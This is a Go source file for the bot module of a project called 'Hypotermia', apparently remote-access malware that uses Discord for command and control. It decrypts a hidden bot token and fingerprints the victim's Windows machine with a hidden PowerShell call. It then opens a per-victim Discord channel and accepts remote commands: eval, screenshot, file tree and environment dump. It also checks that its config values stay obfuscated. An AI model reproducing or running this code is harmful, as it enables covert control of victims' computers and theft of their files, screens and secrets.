package bot

import (
	"bytes"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"syscall"

	"Hypotermia/config"
	"Hypotermia/src/bot/commands"
	"Hypotermia/src/utils/crypto/crypt"

	"github.com/bwmarrin/discordgo"
)

type Command interface {
	Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error
	Name() string
	Info() string
}

var commandsList = make(map[string]Command)

func Init() {
	register()

	if config.FakeToken == "" || config.FakeCategory == "" || config.FakeServer == "" {
		return
	}

	err := validateEncrypted(config.BotToken)
	if err != nil {
		fmt.Println("manager/1 -", err)
		fmt.Scanln()
		return
	}

	err = validateEncrypted(config.ServerId)
	if err != nil {
		fmt.Println("manager/2 -", err)
		fmt.Scanln()
		return
	}

	err = validateEncrypted(config.CategoryId)
	if err != nil {
		fmt.Println("manager/3 -", err)
		fmt.Scanln()
		return
	}

	realToken := utils_crypto_crypt.DecryptBasic(config.BotToken)
	dg, err := discordgo.New("Bot " + realToken)
	if err != nil {
		fmt.Println("manager/4 -", err)
		fmt.Scanln()
		return
	}

	dg.AddHandler(handler)

	err = dg.Open()
	if err != nil {
		fmt.Println("manager/5 -", err)
		return
	}

	categoryId := utils_crypto_crypt.DecryptBasic(config.CategoryId)
	channelId := getChannel(dg, categoryId, getHWID())
	if channelId != "" {
		dg.ChannelMessageSend(channelId, "reply to this message to run commands")
	}

	select {}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if !strings.HasPrefix(m.Content, config.Prefix) {
		return
	}

	args := strings.Fields(m.Content[len(config.Prefix):])
	if len(args) == 0 {
		return
	}

	cmdName := args[0]
	cmd, exists := commandsList[cmdName]

	if cmdName == "help" {
		var helpStr string = "commands:\n"

		for _, cmd := range commandsList {
			helpStr += cmd.Name() + " - " + cmd.Info() + "\n"
		}

		helpStr += "\nprefix: `>`"

		s.ChannelMessageSendReply(m.ChannelID, helpStr, m.Reference())
		return
	}

	if exists {
		cmd.Run(s, m, args[1:])
	} else {
		s.ChannelMessageSendReply(m.ChannelID, "This command does not exist, do `>help` for help.", m.Reference())
	}
}

func register() {
	commandsList["ping"] = &commands.PingCommand{}
	commandsList["eval"] = &commands.EvalCommand{}
	commandsList["ss"] = &commands.ScreenShotCommand{}
	commandsList["tree"] = &commands.TreeCommand{}
	commandsList["env"] = &commands.EnvCommand{}
}

func validateEncrypted(data string) error {
	if len(data) == 0 {
		return fmt.Errorf("data is empty")
	}

	regex := regexp.MustCompile(`[a-zA-Z\.\-_]`)
	if regex.MatchString(data) {
		return fmt.Errorf("contains visible data")
	}

	return nil
}

func getChannel(s *discordgo.Session, categoryID, name string) string {
	serverId := utils_crypto_crypt.DecryptBasic(config.ServerId)
	guild, err := s.Guild(serverId)
	if err != nil {
		return ""
	}

	name = strings.ToLower(strings.TrimSpace(name))
	for _, channel := range guild.Channels {
		channelName := strings.ToLower(strings.TrimSpace(channel.Name))

		if channel.Type == discordgo.ChannelTypeGuildText && channelName == name && channel.ParentID == categoryID {
			return channel.ID
		}
	}

	channel, err := s.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name:     name,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})

	if err != nil {
		return ""
	}

	return channel.ID
}

func getHWID() string {
	cmd := exec.Command("powershell", "-Command", "(Get-CimInstance Win32_ComputerSystemProduct).UUID")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	var out bytes.Buffer
	cmd.Stdout = &out

	err := cmd.Run()
	if err != nil {
		return "UNK_GUID_NF"
	}

	return strings.TrimSpace(out.String())
}
